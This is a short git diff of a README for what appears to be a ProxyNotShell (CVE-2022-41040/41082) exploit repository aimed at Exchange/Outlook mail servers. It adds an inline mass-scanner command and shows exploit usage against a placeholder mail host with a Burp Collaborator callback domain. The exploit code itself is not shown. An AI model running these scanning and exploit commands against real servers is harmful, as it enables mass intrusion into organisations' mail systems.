@@ -5,7 +5,10 @@
 3. Run check.py to check if Outlook servers are vulnerable to ProxyNotShell
 
 ## Mass Scanner
-Trhacknon mass scanner(https://github.com/trhacknon/CVE-2022-41082-MASS-SCANNER)
+Trhacknon mass scanner
+```
+python3 ProxyNotShell-MASS.py
+```
 
 ## Exploit
 [!] Usage: python3 CVE-2022-41040.py -u https://mail.example.com -c example.burpcollaborator.net 
